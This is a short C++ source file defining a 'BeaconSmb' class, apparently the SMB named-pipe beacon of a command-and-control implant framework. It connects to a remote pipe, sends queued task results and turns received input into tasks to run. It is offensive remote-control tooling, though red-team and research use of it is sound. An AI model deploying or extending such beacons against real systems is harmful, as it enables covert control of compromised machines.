#include "BeaconSmb.hpp"
#include <PipeHandler.hpp>

using namespace std;
using namespace PipeHandler;


BeaconSmb::BeaconSmb(std::string& config, const std::string& ip, const std::string& pipeName)
    : Beacon()
{
    // beacon and modules config
    initConfig(config);

    m_clientSmb = new PipeHandler::Client(ip, pipeName);
}


BeaconSmb::~BeaconSmb()
{
    delete m_clientSmb;
}


void BeaconSmb::checkIn()
{
    if (!m_clientSmb->initConnection())
        return;

    if (m_pendingOutput.empty())
        taskResultsToCmd(m_pendingOutput);

    if (m_clientSmb->sendData(m_pendingOutput))
    {
        m_pendingOutput.clear();
        string input;
        if (m_clientSmb->receiveData(input) && !input.empty())
            cmdToTasks(input);
    }

    m_clientSmb->closeConnection();
}

